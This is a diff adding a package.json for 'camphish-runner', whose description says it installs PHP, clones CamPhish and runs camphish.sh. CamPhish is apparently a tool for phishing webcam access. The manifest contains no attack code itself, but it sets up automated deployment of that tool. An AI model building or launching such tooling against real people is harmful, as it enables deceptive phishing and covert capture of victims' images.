@@ -1,0 +1,13 @@
+{
+  "name": "camphish-runner",
+  "version": "1.0.0",
+  "description": "Auto-installs static PHP, clones CamPhish, and runs camphish.sh.",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "dependencies": {}
+}
